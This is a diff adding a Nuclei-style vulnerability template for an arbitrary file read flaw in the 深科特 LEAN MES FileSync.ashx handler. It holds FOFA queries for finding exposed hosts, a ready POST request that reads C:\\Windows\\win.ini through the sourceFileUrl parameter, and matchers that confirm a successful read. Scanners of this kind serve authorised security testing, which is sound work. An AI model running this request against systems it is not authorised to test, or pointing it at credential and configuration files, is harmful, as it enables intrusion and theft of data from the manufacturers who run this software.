@@ -1,0 +1,27 @@
+id: shenke-te-lean-mes-system-file-sync-ashx-arbitrary-file-read
+info:
+  name: 深科特LEAN MES系统FileSync.ashx组件任意文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa:title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+    该组件存在路径验证缺陷，导致攻击者能够构造恶意请求以读取目标系统上的任意文件。成功利用此漏洞可能导致敏感配置文件、系统日志等受保护资源泄露。
+  tags: 深科特
+http:
+- raw:
+  - |
+    POST /Handler/FileSync.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    type=DownLoad&sourceFileUrl=C:\\Windows\\win.ini
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - for 16-bit app support
